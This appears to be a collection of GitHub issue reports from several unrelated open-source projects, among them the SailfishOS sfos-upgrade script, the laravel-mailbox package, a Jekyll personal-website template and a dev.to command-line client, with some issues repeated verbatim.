A possible reason for this is, that the \'sailfish-osupdateservice osupdate-che
ck\' invoked by osupdate-check.service (which is regularly triggered by osupdat
e-check.timer) does more than just checking (observed with SailfishOS 3.0.2 and
earlier): E.g., setting ssu to the recent release version or next stop release
.
Never mind, the version for SSU will be set correctly again, later on.

/usr/bin/sfos-upgrade: line 74: [: 11+omp0: integer expression expected
/usr/bin/sfos-upgrade: line 78: [: 11+omp0: integer expression expected
Warning from function compare_versions: Version strings "3.0.0.8" and "3.0.0.11
+omp0.1.3.10" are not comparable!
```
[root@Sailfish nemo]# See [the first try to adapt to obs with subsequent discussion](https://github.com/r0kk3rz/sfos-upgrade/commit/8949a808921367550b5ee13797da1090ffd46f7b) and [a separate discussion, first one spawned](https://github.com/Olf0/sfos-upgrade/commit/a31be782b3ee800c176b1e686f1530b33856d345).

SRPM is now provided, see [this comment for details](https://github.com/r0kk3rz/sfos-upgrade/commit/8949a808921367550b5ee13797da1090ffd46f7b#commitcomment-35089971).
But I still don't know / understand, if this (an SRPM) resolves the original issue (integration into build systems, e.g. obs). Within the current 2.7-1 release I found an error that prevented me from executing the script in the first run:
Within the for-loop starting from line 406 (current master branch) you forgot to end the (outer) if clause at around line 415 (between the emit_newline and the end-of-for-loop line).
Little hint: As I found out last week, bash also has an integrated syntax check with the option '-n', I used frequently since then, but maybe you know it already.
Nonetheless, great script and great work in general.

Best regards,
Frank Comparing version strings lexicographically may fail, if a version field is a single digit in one version string and double digit in the other strings.
Hence, e.g. 3.0.3.9 -> 3.0.3.10 is incorrectly determined to be a downgrade (as described in the [original report](https://openrepos.net/comment/29525#comment-29525)). Hi,

Would you mind adding the pre-upgrade script for themepacksupport?

Its path is /usr/share/harbour-themepacksupport/ocr.sh

(It restores default themes/display options in one click. I have a systemd service if the upgrade is triggered via UI, but I'm pretty sure it doesn't work if the upgrade is triggered via cli.).

Br,

Fra Comparing version strings lexicographically may fail, if a version field is a single digit in one version string and double digit in the other strings.
Hence, e.g. 3.0.3.9 -> 3.0.3.10 is incorrectly determined to be a downgrade (as described in the [original report](https://openrepos.net/comment/29526#comment-29526)). Within the current 2.7-1 release I found an error that prevented me from executing the script in the first run:
Within the for-loop starting from line 406 (current master branch) you forgot to end the (outer) if clause at around line 415 (between the emit_newline and the end-of-for-loop line).
Little hint: As I found out last week, bash also has an integrated syntax check with the option '-n', I used frequently since then, but maybe you know it already.
Nonetheless, great script and great work in general.

Best regards,
Frank [Original report at OpenRepos](https://openrepos.net/comment/29625#comment-29625) by [@dalas_revo](https://openrepos.net/users/dalasrevo-0):
"Unfortunately upgrading from 3.0.2.8 to 3.0.3.10 on the Aigo (Jolla Tablet) fails for me with sfos-upgrade, complaining about a missing /sys/class/power_supply/battery/uevent."

I might introduce an override for this, after some more analysis:
- Sounds, as if that did not happen during earlier upgrades of SailfishOS with **sfos-upgrade** on your Aigo tablet, or was upgrading from 3.0.2.8 to 3.0.3.10  the first use of **sfos-upgrade** on your Aigo?
- What is the output of the following commands (as root) on this device?
   1. `mount | fgrep sysfs`
   2. `ls -l /sys/class/power_supply`
   3. `ls -l /sys/class/power_supply/battery`
   4. `cat /sys/class/power_supply/uevent`

Checking the battery charge is important, thus I want to avoid implementing an override, if a proper solution can be introduced. [Original report at OpenRepos](https://openrepos.net/comment/29625#comment-29625) by [@dalas_revo](https://openrepos.net/users/dalasrevo-0):
"Unfortunately upgrading from 3.0.2.8 to 3.0.3.10 on the Aigo (Jolla Tablet) fails for me with sfos-upgrade, complaining about a missing /sys/class/power_supply/battery/uevent."

I might introduce an override for this after some more analysis:
- Sounds, as if that did not happen during earlier upgrades of SailfishOS with **sfos-upgrade** on your Aigo tablet, or was upgrading from 3.0.2.8 to 3.0.3.10  the first use of **sfos-upgrade** on your Aigo?
- What is the output of the following commands (as root) on this device?
   1. `mount | fgrep sysfs`
   2. `ls -l /sys/class/power_supply`
   3. `ls -l /sys/class/power_supply/battery`
   4. `cat /sys/class/power_supply/battery/uevent`

Checking the battery charge is important, thus I want to avoid implementing an override, if a proper solution can be introduced. Hi, 

trying to use the script from sfos-upgrade-3.5-5.noarch.rpm on a Gemini PDA under SFOS 3.1.0.11 fails with the script exiting silently (exit code 127).

bash -x tracing reveals that: 

  1. line 412 battery_path="/sys/class/power_supply/\*battery\*" is not evaluated in the loop following it, when there is only one file, /sys/class/power_supply/battery. I worked around this by removing the asterisks. Not sure why this happens though, AFAICS it shouldn't
  2. after this in Line 415, the sourcing fails. This is because when the charger is not connected,  the uevent file has:

    POWER_SUPPLY_STATUS=Not charging

  the space causing an incorrect sourcing.  
  I worked around this by rewriting that section to:

    if [ -e "${battery_uevents}/uevent" ]
    then
      sed 's/STATUS=\(.*\)/STATUS="\1"/' "${battery_uevents}/uevent" > /tmp/battuevent$$
      source /tmp/battuevent$$
      battery_info="sourced"
      break
    fi

which is a dirty, dirty hack but works for me.
 On Jolla 1 version 1.0.8.19 the default (on line 364) in sfos-upgrade

```
btrfs_allocation="$(btrfs filesystem df / | grep '^Data, ' | cut -s -f 2 -d ':' | tr ',' '\n' | tr -d ' ' | rev | grep '^Bi*G[0-9][0-9]\.[0-9][0-9]*=' | sed 's/^Bi*G//g' | tr -d '.' | rev)"
```

gives incorrect results.

But if used (`grep '^Data'` instead of `grep '^Data, '`):

```
btrfs_allocation="$(btrfs filesystem df / | grep '^Data' | cut -s -f 2 -d ':' | tr ',' '\n' | tr -d ' ' | rev | grep '^Bi*G[0-9][0-9]\.[0-9][0-9]*=' | sed 's/^Bi*G//g' | tr -d '.' | rev)"
```

It gives correct results

```
[root@Jolla nemo]# btrfs filesystem df / | grep '^Data' | cut -s -f 2 -d ':' | tr ',' '\n' | tr -d ' ' | rev | grep '^Bi*G[0-9][0-9]\.[0-9][0-9]*=' | sed 's/^Bi*G//g' | tr -d '.' | rev
total=964
used=287
```

I don't have other devices to test the btrfs command with, so I dont know how these differ in different versions, and what is a universal fix. For ported devices stop releases aren't always necessary or possible depending on the state of the adaptation repositories for that device.

it would be nice to tell sfos-update to skip the stop release and go straight to the version its been told to, with appropriate warnings of course Hi,

Would you mind adding the pre-upgrade script for themepacksupport?

Its path is /usr/share/harbour-themepacksupport/ocr.sh

(It restores default themes/display options in one click. I have a systemd service if the upgrade is triggered via UI, but I'm pretty sure it doesn't work if the upgrade is triggered via cli.).

Br,

Fra Unfortunately OBS doesn't use the `Release:` tag part of the RPM Spec and overwrites the `Version:` part with the latest tag information and expects that to be part of the tarball naming.

To fix this, i would suggest a change to the way you number releases, which can be a 3 digit versioning number.

eg. `3.5.8` instead of `3.5-8`

https://github.com/r0kk3rz/sfos-upgrade/commit/cbfd0046c8bed0271de22fe4aa55e91afc6ff20f
https://build.sailfishos.org/package/show/home:r0kk3rz/sfos-upgrade Hi, 

trying to use the script from sfos-upgrade-3.5-5.noarch.rpm on a Gemini PDA under SFOS 3.1.0.11 fails with the script exiting silently (exit code 127).

bash -x tracing reveals that: 

  1. line 412 battery_path="/sys/class/power_supply/\*battery\*" is not evaluated in the loop following it, when there is only one file, /sys/class/power_supply/battery. I worked around this by removing the asterisks. Not sure why this happens though, AFAICS it shouldn't
  2. after this in Line 415, the sourcing fails. This is because when the charger is not connected,  the uevent file has:

    POWER_SUPPLY_STATUS=Not charging

  the space causing an incorrect sourcing.  
  I worked around this by rewriting that section to:

    if [ -e "${battery_uevents}/uevent" ]
    then
      sed 's/STATUS=\(.*\)/STATUS="\1"/' "${battery_uevents}/uevent" > /tmp/battuevent$$
      source /tmp/battuevent$$
      battery_info="sourced"
      break
    fi

which is a dirty, dirty hack but works for me.
 @Okxa wrote in PR #33:
"works when the version is like 1.2.3.4, to fix when `version` reports architechture: `SailfishOS 1.0.8.19 (Tahkalampi) (armv7hl)`" To properly support community adaptions of SailfishOS is probably a longer endeavor, as there currently are many unknowns (for me, at least):
* As I do not own or have access to a device with a community adaption, I never had a chance to try `sfos-upgrade` on one.  Hence the current, "official"  state of support for community adaptions is something between "unknown" and "unsupported".
* OTOH, @rokkerz' side note ([the last paragraph of this comment](https://github.com/Olf0/sfos-upgrade/issues/41#issuecomment-566347446)) sounds as if `sfos-upgrade` does already basically work on devices with community adaptions of SailfishOS.

As `sfos-upgrade` up to now always uses `version --dup` to perform the upgrade proper, which checks if `rnd-dist-upgrade` is installed (usually in `/usr/bin/`) and uses either that or `pkcon upgrade`, respectively complains (since  SFOS3.2.1?), I now wonder why the "zypper dance" / `zypper upgrade` is the primary suggestion from SailfishOS porters for upgrading installations of community adaptions.

Hence I compiled a list of simple questions, trying to pose them in a way that they can be answered with "Yes" or "No".

For my basic understanding:
1. Does the GUI page *Settings -> Sailfish OS updates* exist on "community devices"?
2. If so, does it work?
3. Is the Jolla Store app available?
4. If so, does it work?
   (Granted that one created an Jolla Store account, is logged in to it and only for apps free of charge.)

To understand the technical differences:

5. Is the `version` shell script preinstalled (usually in `/usr/bin/`)?
6. Is the `rnd-dist-upgrade` binary installed (usually in `/usr/bin/`), when "developer mode" is enabled in the SailfishOS' Settings (which I assume every user of a "community device" has)?
7. Do you understand, why `zypper upgrade` is preferred over `pkcon upgrade` by "community porters", in contrast to Jolla's general preference of `pkcon` over `zypper` (also specifically for the upgrade case)?
  Both, `pkcon` and `zypper` use `libzypp` as backend (on SailfishOS) and hence should yield the same package transactions and result.  Maybe `zypper`'s more elaborate output and configurability is the only reason, why porters prefer it.
<---------->
166869378
Hi there

I can see that I can define a custom model to use in the config file:

```
    /*
     * The model class to use when converting an incoming email to a message.
     * It must extend the default model class
     */
    'model' => \BeyondCode\Mailbox\InboundEmail::class,
```
Above is the default model it uses.
I have changed it to:

```
    /*
     * The model class to use when converting an incoming email to a message.
     * It must extend the default model class
     */
    'model' => Email::class,
```

Now, I wish to use my own model, because I want to store the e-mails on another table. For this, I have created my own model:

App/Email.php:
```
namespace App;

use BeyondCode\Mailbox\InboundEmail as InboundEmail;

class Email extends InboundEmail
{
    protected $table = 'emails';
}
```

However, above gives me below error:
```
Undefined property: App\Email::$message {"exception":"[object] (ErrorException(code: 0): Undefined property: App\\Email::$message at /Users/Username/Sites/playground/vendor/beyondcode/laravel-mailbox/src/InboundEmail.php:130)
```

I suspect it is because I don't have the original methods in my own model `App/Email.php`, that are present in the package model.

Isn't there a way that I can use my own model, by extending the package model, but without copying the content of the package model into my own? If I try to test webhook via mailgun, it's getting an exception:
I'm trying this via **ngrok** proxy, and this is what i'm getting as a response.
```
ErrorException: hash_equals(): Expected known_string to be a string, array given in file /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php on line 51
Stack trace:
  1. ErrorException-&gt;() /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php:51
  2. hash_equals() /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php:51
  3. BeyondCode\Mailbox\Http\Requests\MailgunRequest-&gt;verifySignature() /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php:31
  4. BeyondCode\Mailbox\Http\Requests\MailgunRequest-&gt;BeyondCode\Mailbox\Http\Requests\{closure}() /var/www/html/vendor/laravel/framework/src/Illuminate/Validation/Validator.php:253
  5. call_user_func_array() /var/www/html/vendor/laravel/framework/src/Illuminate/Validation/Validator.php:253
```
And this is what i get when i dump mailgun response from **MailgunRequest** class (my private data like tokens and domain keys were changed to "XXX"). 
In `validator()` method i do `var_dump($this->all());exit;`
```
Response: array(2) {
    ["signature"]=>
  array(3) {
        ["timestamp"]=>
    string(10) "1567593293"
        ["token"]=>
    string(50) "xxx"
        ["signature"]=>
    string(64) "xxx"
  }
  ["event-data"]=>
  array(14) {
        ["tags"]=>
    array(2) {
            [0]=>
      string(8) "my_tag_1"
            [1]=>
      string(8) "my_tag_2"
    }
    ["timestamp"]=>
    float(1521472262.9082)
    ["storage"]=>
    array(2) {
            ["url"]=>
      string(110) "https://se.api.mailgun.net/v3/domains/sandboxXXX.mailgun.org/messages/message_key"
            ["key"]=>
      string(11) "message_key"
    }
    ["envelope"]=>
    array(4) {
            ["sending-ip"]=>
      string(14) "209.61.154.250"
            ["sender"]=>
      string(55) "bob@sandboxXXX.mailgun.org"
            ["transport"]=>
      string(4) "smtp"
            ["targets"]=>
      string(17) "alice@example.com"
    }
    ["recipient-domain"]=>
    string(11) "example.com"
        ["id"]=>
    string(22) "XXX"
        ["campaigns"]=>
    array(0) {
        }
    ["user-variables"]=>
    array(2) {
            ["my_var_1"]=>
      string(19) "Mailgun Variable #1"
            ["my-var-2"]=>
      string(7) "awesome"
    }
    ["flags"]=>
    array(4) {
            ["is-routed"]=>
      bool(false)
      ["is-authenticated"]=>
      bool(true)
      ["is-system-test"]=>
      bool(false)
      ["is-test-mode"]=>
      bool(false)
    }
    ["log-level"]=>
    string(4) "info"
        ["message"]=>
    array(3) {
            ["headers"]=>
      array(4) {
                ["to"]=>
        string(25) "Alice <alice@example.com>"
                ["message-id"]=>
        string(78) "123123123.18666.16540@sandboxXXXmailgun.org"
                ["from"]=>
        string(61) "Bob <bob@sandboxXXX.mailgun.org>"
                ["subject"]=>
        string(22) "Test delivered webhook"
      }
      ["attachments"]=>
      array(0) {
            }
      ["size"]=>
      int(111)
    }
    ["recipient"]=>
    string(17) "alice@example.com"
        ["event"]=>
    string(9) "delivered"
        ["delivery-status"]=>
    array(9) {
            ["tls"]=>
      bool(true)
      ["mx-host"]=>
      string(19) "smtp-in.example.com"
            ["attempt-no"]=>
      int(1)
      ["description"]=>
      NULL
      ["session-seconds"]=>
      float(0.43319892883301)
      ["utf8"]=>
      bool(true)
      ["code"]=>
      int(250)
      ["message"]=>
      string(2) "OK"
            ["certificate-verified"]=>
      bool(true)
    }
  }
}
``` Hi,

Is there any kind of inbound spam filtering? Since now when you do a catchall, the inbox is full of junk.... Hi

I have defined my own model called `Email`, that is extending the default `InboundEmail` model.

I can see in the `Routing/Router.php` file, the `save()` method is like this:

```
protected function storeEmail(InboundEmail $email)
{
     $email->save();
}
```

Now in my `Email` model, I:

- Have extended it to use a new table.
- Is setting a custom variable, in order to "combine" it to a relationship.

In my AppServiceProvider, I am passing the custom variable (`token`) to my Model:

`AppServiceProvider`:
`Mailbox::to('{token}@myapp.com', Email::class);`

`Email.php`:

```
    protected $table = 'emails';

    public function __invoke(InboundEmail $email, $token)
    {
        $email->stream_token = $token;
    }

    /**
     * An email belongs to a Stream.
     */
    public function stream()
    {
        return $this->belongsTo(Stream::class, 'stream_token');
    }
```

Now my question is: how can I extend the save method, so I can check if the relationship exists in the database before persiting it?

Because my code will fail (500 internal server error), if I send an email to an internal email, but where the `{token)` does not exist in the database.

Can I do something like this in my `Email.php` model:

```
protected function storeEmail(InboundEmail $email, $token)
{
     if($email->stream->exists()){
     $email->stream_token = $token;
     $email->save();
     }else{
      Log::debug('Invalid "to" token. It does not exist in our system');
     
    }
}
``` I swear I tested this about 9 months ago and I was able to receive an email through laravel-mailbox. Today I tried it again and this time I am getting `Invalid Mailgun signature or timestamp., Url:https://api.redacted.com/laravel-mailbox/mailgun/mime` errors

I'm using the `HTTP webhook signing key` which has to be the right one

I've gone inside the Mailgun Routes and set the `forwarding` to forward a copy to `https://api.redacted.com/laravel-mailbox/mailgun/mime`

I've followed the rest of the setup guide and I can't figure out what I'm doing wrong!

Can someone please help me out.. thanks! Hi,
I'm using Laravel Mailbox with Mailgun but the functions are not triggered when I send the emails.
If I use the tool "Send a sample POST" from Mailgun, using the url http://mywebsite.com/laravel-mailbox/mailgun/mime the response is "MethodNotAllowedHttpException"

Can you help me please?

Thank you So, I want to be able to have 2 email inboxes, one for global use (a catch-all) and one for specific user use, like john@domain.com and doe@domain.com etc...

Now, I first of all stumbled over the fact on how I should implement this package... I currently have a Laravel 5.8 application, with the package installed (all default values). In my `routes/api.php`, I have the following lines added:

```php
Route::post('mailbox/inbound', static function () {
    Mailbox::catchAll(CatchAllMailbox::class);
});
```

(as stated in the docs).

However, when I send a POST request to `http://application.docker/api/mailbox/inbound` with the [example payload](https://sendgrid.com/docs/for-developers/parsing-email/setting-up-the-inbound-parse-webhook/#example-raw-payload) of the sendgrid docs, I just get a 200 response, but nothing hapens (I did set `.env` variables with the `MAILBOX_DRIVER=sendgrid` and once to `MAILBOX_DRIVER=log`.

I'm using a DigitalOcean server, with cloudflare (as DNS).
Below a screenshot of the Cloudflare settings for email:

![cloudflare email settings](https://i.imgur.com/3UBiI29.png)

The configuration for the inbound emails in sendgrid is the following:

![Sendgrid inbound configuration](https://i.imgur.com/T1x3SwR.png)

I currently use the staging environment (on my local server) to test the inbound emails).

I tried to follow the installation, and everything worked as intended. However, whatever I do to test the package, I never ever get to receive enything. What am I doing wrong here? Is there somewhere a decent tutorial on how to make an email inbox with this package? I can find alot of tutorials and explainations about how to send, but nowhere on how to receive....

Thank you in advance!

Kindest regards,

Robin Hi,

Is there any kind of inbound spam filtering? Since now when you do a catchall, the inbox is full of junk.... So, I want to be able to have 2 email inboxes, one for global use (a catch-all) and one for specific user use, like john@domain.com and doe@domain.com etc...

Now, I first of all stumbled over the fact on how I should implement this package... I currently have a Laravel 5.8 application, with the package installed (all default values). In my `routes/api.php`, I have the following lines added:

```php
Route::post('mailbox/inbound', static function () {
    Mailbox::catchAll(CatchAllMailbox::class);
});
```

(as stated in the docs).

However, when I send a POST request to `http://application.docker/api/mailbox/inbound` with the [example payload](https://sendgrid.com/docs/for-developers/parsing-email/setting-up-the-inbound-parse-webhook/#example-raw-payload) of the sendgrid docs, I just get a 200 response, but nothing hapens (I did set `.env` variables with the `MAILBOX_DRIVER=sendgrid` and once to `MAILBOX_DRIVER=log`.

I'm using a DigitalOcean server, with cloudflare (as DNS).
Below a screenshot of the Cloudflare settings for email:

![cloudflare email settings](https://i.imgur.com/3UBiI29.png)

The configuration for the inbound emails in sendgrid is the following:

![Sendgrid inbound configuration](https://i.imgur.com/T1x3SwR.png)

I currently use the staging environment (on my local server) to test the inbound emails).

I tried to follow the installation, and everything worked as intended. However, whatever I do to test the package, I never ever get to receive enything. What am I doing wrong here? Is there somewhere a decent tutorial on how to make an email inbox with this package? I can find alot of tutorials and explainations about how to send, but nowhere on how to receive....

Thank you in advance!

Kindest regards,

Robin If I try to test webhook via mailgun, it's getting an exception:
I'm trying this via **ngrok** proxy, and this is what i'm getting as a response.
```
ErrorException: hash_equals(): Expected known_string to be a string, array given in file /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php on line 51
Stack trace:
  1. ErrorException-&gt;() /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php:51
  2. hash_equals() /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php:51
  3. BeyondCode\Mailbox\Http\Requests\MailgunRequest-&gt;verifySignature() /var/www/html/vendor/beyondcode/laravel-mailbox/src/Http/Requests/MailgunRequest.php:31
  4. BeyondCode\Mailbox\Http\Requests\MailgunRequest-&gt;BeyondCode\Mailbox\Http\Requests\{closure}() /var/www/html/vendor/laravel/framework/src/Illuminate/Validation/Validator.php:253
  5. call_user_func_array() /var/www/html/vendor/laravel/framework/src/Illuminate/Validation/Validator.php:253
``` I've set up mailgun and I notice that I can receive emails whether I have the public or private key setup

it works in both cases. Actually I suppose you can receive emails without even setting up the key. The key is only for replying?

Is it the public or private key we're supposed to use? Any plan to support Laravel 5.8? For some automated emails (leads) a single mail is in `leads@example.com`, but my trigger is for example `company-xxx@mydomain.com`. Would it be possible to parse `X-Forwarded-To` before it was routed to a mailbox? (Eg. an event/filter/callback to modify it manually).

Or should I just create a fallback/catch-all that routes it when To fails? I initially thought this was a composer issue specific to my project and tried everything the internet suggested to reinstall dependencies and clear caches, but I'm still getting a "Class 'App\Providers\Mailbox' not found" error when I attempt to call Mailbox from AppServiceProvider on a brand new Laravel 5.8 project.

It goes away if I let PHPStorm add:
use BeyondCode\Mailbox\Facades\Mailbox;
use BeyondCode\Mailbox\InboundEmail;
But it then reports that it can't find the from method so i suspect it's not a real fix. 

The namespaces aren't in the list in config/app.php, so I've tried to add them in there manually too based on the composer.json in the vendor folder, to no avail. 

Can anyone reproduce this? Thanks and sorry if I'm missing something basic, which I suspect. Hi there

I can see that I can define a custom model to use in the config file:

```
    /*
     * The model class to use when converting an incoming email to a message.
     * It must extend the default model class
     */
    'model' => \BeyondCode\Mailbox\InboundEmail::class,
```
Above is the default model it uses.
I have changed it to:

```
    /*
     * The model class to use when converting an incoming email to a message.
     * It must extend the default model class
     */
    'model' => Email::class,
```

Now, I wish to use my own model, because I want to store the e-mails on another table. For this, I have created my own model:

App/Email.php:
```
namespace App;

use BeyondCode\Mailbox\InboundEmail as InboundEmail;

class Email extends InboundEmail
{
    protected $table = 'emails';
}
```

However, above gives me below error:
```
Undefined property: App\Email::$message {"exception":"[object] (ErrorException(code: 0): Undefined property: App\\Email::$message at /Users/Username/Sites/playground/vendor/beyondcode/laravel-mailbox/src/InboundEmail.php:130)
```

I suspect it is because I don't have the original methods in my own model `App/Email.php`, that are present in the package model.

Isn't there a way that I can use my own model, by extending the package model, but without copying the content of the package model into my own? Does the Mailbox package allow multiple emails?

Meaning within my application there could 1000s of users all with different emails they want to catch incoming and outgoing etc. 

Company A - may have X amount of users using companyA.com as their emails
Company B - may have X amount of users using companyB.com as their emails

Does the package allow for this? I'm trying to get this setup using an incoming "to" as such:

```php
Mailbox::to('{uuid}@mydomain.com', DefaultMailbox::class);
```
The mailbox was never matching, so I created a catch all to test it out:

```php
Mailbox::catchAll(CatchAllMailbox::class);
```

The catch all seems to be working but the email does not seem to be parsed correctly.

Contents of CatchAllMailbox.php
```php
<?php

namespace App\Mailboxes;

use BeyondCode\Mailbox\InboundEmail;

class CatchAllMailbox
{
    public function __invoke(InboundEmail $email)
    {
        logger($email->id());
        logger($email->to());
        logger($email->from());
        logger($email->subject());
        logger('=====================================');
    }
}

```

Log Result
```log
[2019-02-19 11:34:57] local.DEBUG: 20190219113456.1.C52A0016EF9E568D@mydomain.com  
[2019-02-19 11:34:57] local.DEBUG: array (
)  
[2019-02-19 11:34:57] local.DEBUG: postmaster@mydomain.com  
[2019-02-19 11:34:57] local.DEBUG: =====================================  
[2019-02-19 11:38:10] local.DEBUG: 20190219112808.1.FA0D36529944A4DC@mydomain.com  
[2019-02-19 11:38:10] local.DEBUG: array (
)  
[2019-02-19 11:38:10] local.DEBUG: postmaster@mydomain.com  
[2019-02-19 11:38:10] local.DEBUG: =====================================  

```

The `to` list seems to be empty, however if i take the stored message from the database and decode the base64 I can see the `recipient` field is set to `c8896a6b-be27-49d3-afed-950a11540189@mydomain.com` Any plan to support Laravel 5.8?  Gmail and G-suite is the most used email service so it would be great if we have a driver that supports it out of the box.
<---------->
166964651
Hi there,
Thanks for the code.

Is it possible to upgrade your code to ASP.NET MVC or ASP.NET Core MVC?
The web form technology is not supported by Microsoft any more.

Thank you. Hi there,
Thanks for the code.

Is it possible to upgrade your code to ASP.NET MVC or ASP.NET Core MVC?
The web form technology is not supported by Microsoft any more.

Thank you. hi 
i want to test sandbox i i get 404 error code 

<---------->
167033021

<---------->
167459852
Can show contributions count or activity related info?  > bundle exec jekyll serve
is giving me this error
```
Configuration file: /Users/gautam/WebstormProjects/gautamkrishnar.github.io/_config.yml
            Source: /Users/gautam/WebstormProjects/gautamkrishnar.github.io
       Destination: /Users/gautam/WebstormProjects/gautamkrishnar.github.io/_site
 Incremental build: disabled. Enable with --incremental
      Generating... 
   GitHub Metadata: No GitHub API authentication could be found. Some fields may be missing or have incorrect data.
  Conversion error: Jekyll::Converters::Scss encountered an error while converting 'assets/css/style.scss':
                    Invalid US-ASCII character "\xE2" on line 5
jekyll 3.7.4 | Error:  Invalid US-ASCII character "\xE2" on line 5
```
 I think no need to repeat `{{ repository.owner.login }}` in every `_includes/repo-card.html` because it is same for all in this owner-only *personal* project. Not an issue, I have converted this repo to GatsbyJS for JS developers. https://github.com/thakkaryash94/gatsby-github-personal-website this may be a dumb question... but  
following instructions I get a build representing the account of user @github. I don't see anywhere in the `_config.yaml` where the github account should be updated to my own. I tried adding `site: okwme` but it didn't update the build with my content.

Where am I supposed to add which user to build off of?  this may be a dumb question... but  
following instructions I get a build representing the account of user @github. I don't see anywhere in the `_config.yaml` where the github account should be updated to my own. I tried adding `site: okwme` but it didn't update the build with my content.

Where am I supposed to add which user to build off of?  I have a user pages which is working totally fine, so I wanted to create a page for a repository. Theres no error or somethin else in the settings or my mails, but the site is not working (404 Error). Is it even possible to have a user page and a repository page at the same time? I have a user pages which is working totally fine, so I wanted to create a page for a repository. Theres no error or somethin else in the settings or my mails, but the site is not working (404 Error). Is it even possible to have a user page and a repository page at the same time? I have a few repositories that use GitHub-supported emoji's in the description and it would be cool to have the same functionality in the sites repo-cards.  
Implementing this would be pretty simple using [jemoji](https://github.com/jekyll/jemoji), which already sources emoji images from the GitHub.com CDN for Github Pages sites.  

If you'd like I can submit a PR with these changes.

![repo-cards](https://user-images.githubusercontent.com/16360374/53680296-401a5180-3c8e-11e9-848c-0fb4cfddfa3f.png) There are new features to be added every day for this project, how would I keep my own site up-to-date with those features? Currently what I do is delete the fork then re-fork it... (I know this question sounds silly, but I can't find any descriptions in the README about this)

Furthermore, as #14 #21, I really hope we will able to show our preferred repositories, including repositories that are owned by other organisations.

Thanks for all that effort. I'm getting the same UI issue as #58 . Disabling the CSS rule for .height-full solves my problem. Tested on both latest Safari and Chrome on macOS Mojave 10.14.3

This is on https://joseconstela.com/ [repo](https://github.com/joseconstela/joseconstela.github.io) (using master branch forked on 9th March)

<img width="853" alt="Captura de pantalla 2019-03-10 a las 14 18 26" src="https://user-images.githubusercontent.com/6388629/54085520-62bc0280-433f-11e9-9485-6cb89f0adcbf.png">

With the rule disabled (via dev tools)

<img width="843" alt="Captura de pantalla 2019-03-10 a las 14 19 21" src="https://user-images.githubusercontent.com/6388629/54085534-82ebc180-433f-11e9-926b-0626a5cdd301.png">

cc @lucario  ### **/personal-website/_layouts/home.html**
```
<div class="d-md-flex height-full {% unless site.style == 'dark' %}border-md-bottom{% endunless %}">
```
**the `height-full`  will cause layout confusion at the bottom when we view in desktop.
just like this:**
![image](https://wx2.sinaimg.cn/mw690/006aCS7gly1g12f0i84ryj311y0szwhr.jpg)

**when I remove `height-full`, it is okay!**
![image](https://wx4.sinaimg.cn/mw690/006aCS7gly1g12f3fpn3nj311y0u4ade.jpg)
 The idea would be to add your organization repos to the project section. While this issue can be seen as similar to #14 , I still believe it's too different so I created a new issue. Our technical approach to automatically generating personal information relies on Jekyll + GitHub Pages' ability to access "[repository metadata](https://help.github.com/articles/repository-metadata-on-github-pages/)." @parkr informed me that they [recently merged a PR into the `github-metadata` gem](https://github.com/jekyll/github-metadata/pull/151) that does much of this heavy lifting -- it just hasn't been deployed to GitHub Pages, yet, for broader support.

I've been unable to get this to work locally, regardless. So I need some support, A, getting the existing work on the gem to work locally, and B, to ensure we have support for all (or most) of the following user metadata:

### Primary
- Display name
- Username (link to GitHub profile)
- Avatar
- Bio (from GitHub profile)
- Location

### Secondary
- Repos
   - Owner
   - Name
   - Description
   - URL
   - Ideally, stars and forks, too.
- Organizations
- Company
- Blog URL
- Ideally, `hireable`, too

Again, this is in the service of a time-sensitive partnership with Google for their launch of the `.dev` TLD. So your help supporting a **Feb. 12 launch** is much appreciated 👍  https://drafts.csswg.org/mediaqueries-5/#prefers-color-scheme

Should be nice to not have to choose between the two and just use user preference. Hi. 
I am new to Jekyll and this project maked it easy for me to understand how stuff works.

I have a question about the repositories showcase
```
{% for repository in site.github.public_repositories limit: 9 %}
```
Is it possible to iterate over pinned repositories? As someone with a lot of repositories I would like to showcase 9 one the important ones, not just first 9 as those are mostly forks of other open source projects. 

Thanks. This repo in Ruby..
Hexo in Node.js..
Hugo in GoLang..
etc.

What's the difference? This repo in Ruby..
Hexo in Node.js..
Hugo in GoLang..
etc.

What's the difference? Hi, the CSS is broken on my fork of this repo. After looking in Chrome's dev tools, it appears that the rendered HTML is trying to load CSS via HTTP despite the domain being served via HTTPS.

Example: https://winstel.dev/ ([Repo](https://github.com/drewbrew/drewbrew.github.io))

Expected behavior: the `absolute_url` filter would return `https://winstel.dev/assets/styles.css`

Actual behavior: `http://winstel.dev/assets/styles.css`

Net result: CSS is broken with HTTPS-only enforced (as is required on .dev domains)

Thanks! Hi, the CSS is broken on my fork of this repo. After looking in Chrome's dev tools, it appears that the rendered HTML is trying to load CSS via HTTP despite the domain being served via HTTPS.

Example: https://winstel.dev/ ([Repo](https://github.com/drewbrew/drewbrew.github.io))

Expected behavior: the `absolute_url` filter would return `https://winstel.dev/assets/styles.css`

Actual behavior: `http://winstel.dev/assets/styles.css`

Net result: CSS is broken with HTTPS-only enforced (as is required on .dev domains)

Thanks!
<---------->
167500766
[opn](https://www.npmjs.com/package/opn) was deprecated and renamed to [open](https://www.npmjs.com/package/open)  Instead of pressing `ctrl + c` to quit and come back to terminal, it would be handy if pressing just `q` or `esc` do the same. ![Screenshot from 2019-10-26 14-29-49](https://user-images.githubusercontent.com/25279263/67617089-25888000-f7fd-11e9-910a-8a10b64e030d.png)
 How about a feature where we can view the profile details of the user?

Something like:
`devto author anto_christo --profile` 
will display the Name, Email, Location, Work, Joined Date, Links, etc etc on the terminal.

If this feature is needed, I'll add it and send a PR.
Thank you. ```bash
$ devto lates
Usage: devto <command> [options]

A simple package to let you use Dev.to in Terminal

Options:
  -V, --version                  output the version number
  -h, --help                     output usage information

Commands:
  top [timeline]
  tag|t [tag]
  latest|l
  bookmark|bm
  search|s <keyword>
  author|a [options] <username>
  
  Unknown command lates.

  Did you mean latest?
``` Would it be possible to add a proxy arg to allow the CLI to work behind a corporate proxy? Selecting `open link` doesn't fire up the browser. ```bash
> devto lates
